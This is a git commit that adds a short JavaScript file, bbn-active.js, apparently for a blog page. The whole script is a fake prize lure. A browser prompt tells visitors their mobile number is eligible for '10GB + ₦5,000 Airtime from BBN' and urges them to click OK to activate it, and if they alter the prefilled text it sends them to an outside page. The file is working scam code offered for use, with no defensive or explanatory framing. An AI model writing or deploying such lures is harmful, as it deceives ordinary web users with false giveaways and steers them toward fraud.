ae6d5628f585a1d71165e10fe045fe52db50d10f
itidnewblog4 <ukpehaitid2@gmail.com>
2025-10-05 19:01:57 +0100

    Create bbn-active.js

---
+++ bbn-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 10GB + ₦5,000'
+password=prompt('BBN: Congratulations, your mobile number is eligible to receive 10GB + ₦5,000 Airtime from BBN 10/10, click OK to activate now','ACTIVATE 10GB + ₦5,000');
+if (password != 'ACTIVATE 10GB + ₦5,000') {
+location.href='https://phlug.org/bbnshow.html';
+}
